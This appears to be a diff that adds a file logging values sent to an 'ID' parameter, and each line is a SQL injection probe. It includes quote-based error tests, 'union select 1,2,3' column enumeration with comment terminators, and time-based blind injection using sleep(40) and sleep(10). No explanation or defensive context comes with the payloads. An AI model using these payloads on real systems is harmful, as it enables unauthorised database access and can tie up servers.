@@ -1,0 +1,17 @@
+ID:1
+ID:1
+ID:1'
+ID:1'
+ID:1
+ID:1321123123213123' union select 1,2,3-- 
+ID:1321123123213123" union select 1,2,3-- 
+ID:1
+ID:1'
+ID:1''
+ID:1'
+ID:123113' union select 1,2,3 -- 
+ID:-' union select 1,2,3 -- 
+ID:-1' union select 1,2,3 -- 
+ID:-1 union select 1,2,3
+ID:-1 union select 1,sleep(40),3
+ID:-1 union select 1,sleep(10),3
